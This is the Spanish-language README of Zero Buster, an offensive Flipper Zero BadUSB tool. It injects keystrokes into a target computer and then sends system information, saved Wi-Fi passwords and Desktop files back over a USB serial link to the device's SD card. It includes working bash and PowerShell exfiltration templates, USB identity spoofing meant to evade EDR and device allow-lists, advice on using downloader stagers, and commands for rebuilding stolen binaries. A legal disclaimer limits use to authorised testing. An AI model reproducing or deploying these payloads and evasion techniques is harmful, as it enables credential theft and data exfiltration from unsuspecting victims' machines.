# Zero Buster

<p align="center">
  <img src="screenshots/main_menu.png" alt="Zero Buster Main Menu" width="400"/>
</p>

Herramienta avanzada de auditoría de seguridad y simulación de adversarios para **Flipper Zero** que implementa un vector de ataque **BadUSB bidireccional (Duplex)** con exfiltración local a través de emulación serie **USB CDC**, eliminando por completo la dependencia de interfaces de red, conexiones a Internet o servidores C2 externos.

La aplicación permite la inyección automatizada de comandos mediante emulación de teclado (HID) con traducción nativa para distribuciones internacionales (ISO Español y ANSI US), conmutando dinámicamente el bus USB a un puerto serie virtual para capturar telemetría de diagnóstico, credenciales de red y ficheros directamente en la tarjeta MicroSD. Incorpora además capacidades avanzadas de **suplantación de identidad de hardware (USB Spoofing)** en caliente para evadir sistemas EDR y políticas de control de periféricos basadas en listas blancas de dispositivos.

---

## Concepto: ¿Por qué Zero Buster?

En *Mega Man Battle Network*, Lan Hikari conecta su PET a cualquier terminal o dispositivo mediante un cable físico al grito de:
> **«Jack in! MegaMan.EXE, Transmit!»**

**Zero Buster** replica exactamente esa filosofía en el mundo real utilizando el hardware de **Flipper Zero**:
1. **Jack In (HID Injection):** Al enchufar el cable USB, el Flipper emula un teclado de confianza y dispara el payload seleccionado (Battle Chip).
2. **Duplex Channel (CDC Switch):** El Flipper transmuta su interfaz USB a puerto serie virtual (`/dev/ttyACM*` en Linux / `COM*` en Windows).
3. **Data Exfiltration (Loot):** El host transmite telemetría, credenciales Wi-Fi o archivos binarios directamente a la MicroSD del Flipper sin tocar la red local.

---

## Características Principales

### 1. Soporte Nativo de Layouts (Español ISO y US)
Los ataques BadUSB habituales fallan catastróficamente cuando el ordenador víctima utiliza una distribución de teclado en español (los caracteres `;`, `/`, `|`, `=`, `"`, `-`, etc. se transforman en `ñ`, `-`, `Ç`, `)`, `¡`, `'`).
* **Tabla de traducción Scancode ES integrada:** Mapeo a bajo nivel de modificadores `Shift`, `AltGr` (Right Alt) y códigos de tecla ISO (`0x64`, etc.).
* **Seleccionable en pantalla:** Conmuta al instante entre **`ES (Español)`** y **`US (English)`** antes de lanzar el ataque.

### 2. Chips de Batalla (Payloads) Modulares desde la MicroSD
No necesitas recompilar la aplicación cada vez que quieras cambiar de comando o técnica:
* La aplicación escanea automáticamente la carpeta:
  ```text
  /ext/zero_buster/payloads/
  ```
* Puedes cargar tus propios scripts (`.ps1`, `.sh`, `.txt`).
* En la pantalla del Flipper, navega y selecciona en vivo qué payload disparar mediante la cruceta.
* En el primer arranque, la aplicación genera automáticamente las carpetas y 6 payloads por defecto (organizados en 3 para Linux y 3 para Windows). En los siguientes arranques respetará completamente tus cambios, permitiéndote eliminar los que no uses o añadir los tuyos propios sin que se vuelvan a recrear.

### 3. Anonimización de Hardware (USB Spoofing Anti-EDR y Custom HID)
Las soluciones de seguridad corporativas (CrowdStrike, Defender for Endpoint, Trellix) a menudo monitorizan o bloquean periféricos que se identifiquen como *Flipper Devices Inc.* (`VID 0x0483`).
* **Perfiles de suplantación incluidos:**
  * **Logitech K120:** `VID 0x046D` / `PID 0xC31C` (El teclado de oficina más común del mundo).
  * **Dell QuietKey:** `VID 0x413C` / `PID 0x2003`.
  * **Apple Magic Keyboard:** `VID 0x05AC` / `PID 0x0220`.
  * **Flipper Default:** `VID 0x0483` / `PID 0x5740`.
  * **Custom (SD / In-App):** Carga un perfil a medida desde la MicroSD (`/ext/zero_buster/custom_hid.txt`) o edítalo directamente en pantalla.
* Al conectarse al PC, el Administrador de Dispositivos o `lsusb` verá un teclado de oficina legítimo o el dispositivo clonado que elijas.

### 4. Liberación Automática del Bus USB (CLI VCP)
A diferencia de otros scripts BadUSB que dejan el bus USB secuestrado y bloquean la CLI del sistema y la conexión con **qFlipper**:
* La app toma el control exclusivo de `RECORD_CLI_VCP` durante la captura de telemetría.
* Al finalizar la recepción (o si el usuario cancela con `Back`), invoca `zero_buster_release_usb()`:
  * Restaura la configuración USB original.
  * Realiza un ciclado `cli_vcp_disable()` -> `cli_vcp_enable()`.
* **Resultado:** qFlipper y la consola serie del Flipper vuelven a funcionar inmediatamente sin necesidad de reconectar el cable USB ni reiniciar el Flipper.

---

## Estructura del Código

El código fuente sigue la arquitectura canónica de aplicaciones avanzadas para Flipper Zero (`helpers/`, `views/`, `scenes/`):

```text
Proyecto_bad_usb/
├── application.fam                  # Manifiesto de la aplicación (appid: zero_buster)
├── assets/                          # Recursos gráficos del Flipper
│   └── icon.png                     # Icono oficial 10x10 (microchip con Z)
├── zero_buster.h                    # Cabecera principal: tipos globales, enums y contexto
├── zero_buster.c                    # Punto de entrada (zero_buster_app) y ciclo de vida
├── helpers/                         # Lógica de soporte y módulos del sistema
│   ├── zero_buster_hid.h / .c       # Layouts de teclado (ES/US), scancodes y perfiles de hardware
│   ├── zero_buster_storage.h / .c   # Gestión MicroSD: persistencia custom_hid, escaneo y loot
│   └── zero_buster_worker.h / .c    # Hilo worker: inyección BadUSB y captura serie USB CDC
├── views/                           # Renderizado en pantalla e interacción visual
│   └── zero_buster_view.h / .c      # Callbacks Canvas: UI del menú, editor HID y progreso/estado
├── scenes/                          # Máquina de estados y gestión de eventos de usuario
│   ├── zero_buster_scene.h          # Declaración unificada de manejadores de escenas
│   ├── zero_buster_scene_main.c     # Manejador del menú principal y disparo directo
│   ├── zero_buster_scene_about.c    # Manejador de la pantalla de créditos y enlaces
│   ├── zero_buster_scene_edit_hid.c # Manejador interactivo del editor de VID/PID/Strings
│   └── zero_buster_scene_status.c   # Manejador durante ejecución, cancelación y fin de exfiltración
├── payloads/                        # Payloads documentados y autoexplicativos
│   ├── 01_linux_exfiltracion.sh     # Linux: Reconocimiento del sistema y red
│   ├── 02_linux_wifi.sh             # Linux: Volcado de credenciales Wi-Fi (NetworkManager)
│   ├── 03_linux_archivos.sh         # Linux: Exfiltración de prueba.txt y prueba.exe (Base64)
│   ├── 04_win_exfiltracion.ps1      # Windows: Reconocimiento del sistema y red
│   ├── 05_win_wifi.ps1              # Windows: Volcado de credenciales Wi-Fi (Bilingüe ES/EN)
│   └── 06_win_archivos.ps1          # Windows: Exfiltración de prueba.txt y prueba.exe (Desktop/OneDrive)
├── dist/
│   └── zero_buster.fap              # Binario compilado listo para flashear
└── README.md                        # Documentación técnica completa
```

---

## Compilación e Instalación

### Compilar el binario `.fap`:
```bash
./venv/bin/ufbt
```

### Instalar en el Flipper Zero:
Conecta tu Flipper por USB y ejecuta:
```bash
./venv/bin/ufbt launch
```
*(O copia `dist/zero_buster.fap` a la carpeta `apps/USB/` de tu tarjeta MicroSD).*

---

## Controles en Pantalla

### Menú Principal:
* **[OK] (Pulsación corta):**
  * Si estás sobre las opciones `PID:`, `KEY:` o `HID:`, ejecuta **¡Jack In Inmediato!** lanzando la inyección y exfiltración directamente desde cualquier opción seleccionada sin tener que desplazarte.
  * Si estás sobre `Cfg:`, abre el editor interactivo de Custom HID.
  * Si estás sobre `Info:`, abre la pantalla de información y créditos del autor.
* **Arriba / Abajo:** Navega entre los ajustes y opciones disponibles:
  1. `PID:`: Payload seleccionado (escanea `/ext/zero_buster/payloads/`).
  2. `KEY:`: Distribución de teclado (`ES (Espanol)` o `US (English)`).
  3. `HID:`: Perfil de hardware USB (`Logitech K120`, `Dell`, `Apple`, `Flipper`, `Custom`).
  4. `Cfg:`: `[ Edit Custom HID > ]` *(Visible solo cuando `HID: Custom` está activo)*.
  5. `Info:`: `[ Creditos / About > ]` (Acceso a la vista de créditos, versión, GitHub y LinkedIn).
* **Izquierda / Derecha:** Modifica el valor del ajuste seleccionado (cambia payload, layout o perfil HID).
* **Pie informativo inferior:** Muestra dinámicamente la acción asociada al pulsar OK (`[ OK = Jack In! ]`, `[ OK = Editar Custom HID ]` o `[ OK = Ver Creditos ]`).
* **[Back]:** Cancela la ejecución en curso o sale de la aplicación.

### Pantalla de Información y Créditos (`Info / About`):
Se accede pulsando **[OK]** sobre `Info: [ Creditos / About > ]`:
* Muestra la versión del programa (`Zero Buster v1.1`), el autor (**Javier Julve**) y los enlaces oficiales:
  * GitHub: `github.com/DonJulve`
  * LinkedIn: `in/javier-julve-yubero`
* **[OK] / [Back]:** Regresa al menú principal.

### Editor de HID en Pantalla (`HID Editor`):
Se accede pulsando **[OK]** sobre `Cfg: [ Edit Custom HID > ]` (o manteniendo pulsado **[OK]** sobre `HID: Custom`):
* **Izquierda / Derecha:** Mueve el cursor entre los dígitos hexadecimales (0-F) de `VID`, `PID`, fabricante (`Mfg`), producto (`Prd`) y el botón `[ SAVE & EXIT ]`.
* **Arriba / Abajo:** Incrementa / decrementa el dígito hexadecimal seleccionado o rota entre presets de fabricante/producto.
* **[OK] / [Back]:** Guarda la nueva configuración directamente en `/ext/zero_buster/custom_hid.txt` en la MicroSD y vuelve al menú principal.

### Cancelar Operación en Curso:
Durante cualquier fase activa (Charging NetLink, Jack In Transmitting, Switching CDC, Exfiltrating), se muestra en pantalla:
```
[<] Cancel
```
Pulsar **[Back]** cancela de forma limpia: detiene el hilo de trabajo, libera el bus USB y regresa al menú principal.

---

## Chips de Batalla (Payloads Incluidos)

La aplicación genera automáticamente 6 payloads por defecto en la MicroSD (`/ext/zero_buster/payloads/`):

| # | Archivo en MicroSD | SO | Descripción |
|---|---|---|---|
| **01** | `01_linux_exfiltracion.sh` | Linux | Reconocimiento del sistema: hostname, usuario, kernel, interfaces de red |
| **02** | `02_linux_wifi.sh` | Linux | **Extracción de contraseñas Wi-Fi** guardadas (NetworkManager / nmcli) |
| **03** | `03_linux_archivos.sh` | Linux | **Robo de archivos del Escritorio**: extrae `prueba.txt` y `prueba.exe` (en Base64) |
| **04** | `04_win_exfiltracion.ps1` | Windows | Reconocimiento del sistema: hostname, usuario, versión de OS, interfaces de red |
| **05** | `05_win_wifi.ps1` | Windows | **Extracción de contraseñas Wi-Fi** guardadas (bilingüe ES/EN: WPA2 Key en texto claro) |
| **06** | `06_win_archivos.ps1` | Windows | **Robo de archivos del Escritorio**: busca en `Desktop` y `OneDrive\Desktop`, extrae `prueba.txt` y `prueba.exe` |

---

## Cómo Crear tus Propios Payloads (Chips de Batalla)

Zero Buster es completamente modular. Para añadir nuevos ataques o herramientas de recolección de datos, solo necesitas crear un script y guardarlo en la carpeta de la MicroSD:
```text
/ext/zero_buster/payloads/
```

### Protocolo de Comunicación Duplex (4 Fases Obligatorias)

Todo payload compatible con Zero Buster debe cumplir las siguientes fases:

1. **Inyección Inicial (BadUSB):** El Flipper abre la terminal del sistema (`Win + R` -> PowerShell en Windows, `Ctrl + Alt + T` en Linux) y tipea el código del script directamente en el intérprete.
2. **Detección Dinámica del Puerto Serie:** El Flipper cambia su interfaz física de teclado USB HID a puerto serie USB CDC (`/dev/ttyACM*` en Linux / `COM*` en Windows). El script debe sondear en bucle durante varios segundos hasta que el sistema operativo registre el nuevo dispositivo.
3. **Pausa de Asentamiento y Apertura Serie:** Tras detectar el puerto, el script debe pausar entre 800 y 1000 milisegundos para permitir que el Flipper abra el fichero `loot_XXX.txt` en la MicroSD. A continuación, abre el puerto serie a **115200 baudios** con las señales **DTR** y **RTS** activadas.
4. **Marcador de Finalización Obligatorio (`<<<EOF>>>`):** Al concluir el volcado de datos, el script **debe transmitir la cadena exacta `<<<EOF>>>`** y cerrar el puerto. Esta marca le indica al Flipper que cierre el archivo de botín, restaure el bus USB original y muestre *Mission Complete!*.

---

### Plantilla Base para Linux (`.sh`)

Crea un archivo con extensión `.sh` (por ejemplo, `07_linux_custom.sh`):

```bash
# 1. Espera activa a que el Flipper conmute de HID a CDC
for i in $(seq 1 40); do
    dev=$(ls /dev/ttyACM* 2>/dev/null | head -n1)
    [ -n "$dev" ] && break
    sleep 0.2
done

# 2. Si se detecta el puerto, esperamos a que la SD este lista
if [ -n "$dev" ]; then
    sleep 0.8
    (
        echo "=== MI PAYLOAD PERSONALIZADO (LINUX) ==="
        echo "Host: $(hostname)"
        echo "Usuario: $(whoami)"
        echo "Fecha: $(date)"
        echo "----------------------------------------"
        # Tus comandos de recoleccion aqui:
        uptime
        df -h
        echo "========================================"
        # 3. Marcador de cierre obligatorio
        echo "<<<EOF>>>"
    ) > "$dev"
fi
```

---

### Plantilla Base para Windows (`.ps1`)

Crea un archivo con extensión `.ps1` (por ejemplo, `07_win_custom.ps1`):

```powershell
# 1. Cargar ensamblado .NET para comunicacion serie
Add-Type -AssemblyName System.IO.Ports

# 2. Bucle de sondeo para detectar el puerto COM del Flipper
$targetPort = $null
for ($i = 0; $i -lt 40; $i++) {
    $ports = [System.IO.Ports.SerialPort]::GetPortNames()
    if ($ports.Count -gt 0) {
        # Selecciona el COM con numero mas alto (evita el COM1 estatico de placa base)
        $targetPort = ($ports | Sort-Object { [int]($_ -replace '\D') } | Select-Object -Last 1)
        if ($ports.Count -gt 1 -or $targetPort -ne "COM1") { break }
    }
    Start-Sleep -Milliseconds 250
}

if (-not $targetPort -and $ports.Count -gt 0) {
    $targetPort = $ports[-1]
}

if ($targetPort) {
    # 3. Pausa de asentamiento para sincronizar con la MicroSD
    Start-Sleep -Milliseconds 1000

    $serial = New-Object System.IO.Ports.SerialPort $targetPort, 115200, None, 8, One
    $serial.DtrEnable = $true
    $serial.RtsEnable = $true

    try {
        $serial.Open()
        $serial.WriteLine("=== MI PAYLOAD PERSONALIZADO (WINDOWS) ===")
        $serial.WriteLine("Host: " + $env:COMPUTERNAME)
        $serial.WriteLine("Usuario: " + $env:USERNAME)
        $serial.WriteLine("----------------------------------------")
        # Tus comandos de recoleccion aqui:
        $serial.WriteLine("Directorio actual: " + (Get-Location).Path)
        $serial.WriteLine("Procesos activos: " + (Get-Process | Measure-Object).Count)
        $serial.WriteLine("========================================")
    } catch {
        # Manejo silencioso de excepciones
    } finally {
        # 4. Envio garantizado de EOF incluso ante errores
        try {
            $serial.WriteLine("<<<EOF>>>")
            Start-Sleep -Milliseconds 200
            $serial.Close()
        } catch {}
    }
}
exit
```

---

### Reglas y Buenas Prácticas

1. **Orden en el Menú:** El Flipper ordena los scripts alfabéticamente. Usa prefijos numéricos de dos dígitos (`01_`, `02_`, ..., `07_`) para fijar la posición deseada en pantalla.
2. **Detección de Sistema:** Incluye `linux` o `.sh` en el nombre para payloads de Linux; incluye `win` o `.ps1` para Windows. La app utiliza este criterio para decidir si lanza la combinación de teclas de Windows (`Win + R`) o de Linux (`Ctrl + Alt + T`).
3. **Límite de Tamaño:** El buffer en memoria para tipeo directo está configurado en `PAYLOAD_BUF_SIZE = 2048` bytes. Mantén tus scripts optimizados y concisos. Si necesitas scripts más extensos, usa el script como un descargador (stager) en una línea que descargue o ejecute el resto.
4. **Archivos Binarios:** Si vas a exfiltrar ejecutables, imágenes o documentos protegidos, conviértelos siempre a **Base64** antes de enviarlos por el puerto serie para evitar que bytes de control nulos (`0x00`) o secuencias de escape corrompan la transmisión.
5. **Bloque `finally` en PowerShell:** En Windows, envuelve siempre la escritura del marcador final en un bloque `finally` para asegurar que `<<<EOF>>>` se transmita incluso si algún comando intermedio genera una excepción.

---

## Reconstrucción de Binarios (`prueba.exe`) a partir del Loot

El archivo de texto `prueba.txt` se guarda en texto claro en el log correspondiente.

Para los archivos binarios (`prueba.exe`), el payload los transmite codificados en **Base64** para no corromper los bytes de control de la comunicación serie USB. Para recuperarlo en tu ordenador:

* **En Linux / macOS:**
  ```bash
  sed -n '/--- BEGIN prueba.exe (BASE64) ---/,/--- END prueba.exe (BASE64) ---/p' loot_001.txt | grep -v '---' | base64 -d > prueba.exe
  ```
* **En Windows (PowerShell):**
  ```powershell
  $raw = Get-Content loot_001.txt -Raw
  $b64 = [regex]::Match($raw, '(?s)--- BEGIN prueba\.exe \(BASE64\) ---\r?\n(.*?)\r?\n--- END').Groups[1].Value
  [IO.File]::WriteAllBytes("prueba.exe", [Convert]::FromBase64String($b64))
  ```

---

## Botín Exfiltrado (Loot)

Los datos exfiltrados por USB CDC se guardan automáticamente en una carpeta dedicada llamada `loot` con numeración incremental en tu MicroSD:
```text
/ext/zero_buster/loot/loot_001.txt
/ext/zero_buster/loot/loot_002.txt
...
```
Cada ejecución exitosa muestra en pantalla:
```
Mission Complete!
Total: XXXX bytes
File: loot_XXX.txt
[ OK / Back = Salir ]
```

Si el usuario cancela la ejecución (`Back`) o finaliza por inactividad sin datos recibidos, la aplicación no almacena archivos vacíos ni parciales, manteniendo limpio el directorio de loot en la MicroSD.

---

## Autor y Créditos

* **Desarrollador:** Javier Julve ([@DonJulve](https://github.com/DonJulve))
* **Repositorio Oficial:** [Zero Buster en GitHub](https://github.com/DonJulve/Zero_Buster)
* **LinkedIn:** [Javier Julve Yubero](https://www.linkedin.com/in/javier-julve-yubero)

---

## Aviso Legal y Descargo de Responsabilidad (Disclaimer)

Este software y sus herramientas asociadas han sido diseñados, desarrollados y distribuidos **únicamente con fines educativos, de investigación académica y para auditorías de seguridad autorizadas** (pruebas de penetración y ejercicios de Red Team bajo consentimiento informado).

1. **Uso Autorizado:** El uso de esta aplicación en sistemas o redes informáticas ajenas sin la autorización previa, expresa y por escrito de sus legítimos propietarios es estrictamente ilegal y puede constituir delito bajo la legislación vigente (incluyendo los Artículos 197 bis, 197 ter y 264 del Código Penal Español, así como normativas internacionales equivalentes sobre acceso no autorizado e interceptación de datos).
2. **Exención de Responsabilidad:** El autor (@DonJulve) del proyecto no se hacen responsables bajo ninguna circunstancia de daños directos, indirectos, pérdidas de información, sanciones administrativas o responsabilidades civiles y penales derivadas del mal uso o actividades ilícitas cometidas por terceros utilizando este software o sus scripts asociados.
3. **Responsabilidad del Usuario:** Al descargar, clonar, compilar o ejecutar este software, el usuario asume de manera íntegra, exclusiva e intransferible toda la responsabilidad legal y ética sobre el uso de la herramienta, comprometiéndose a emplearla únicamente en entornos de laboratorio controlados o sobre infraestructuras respecto de las cuales cuente con consentimiento expreso por escrito.
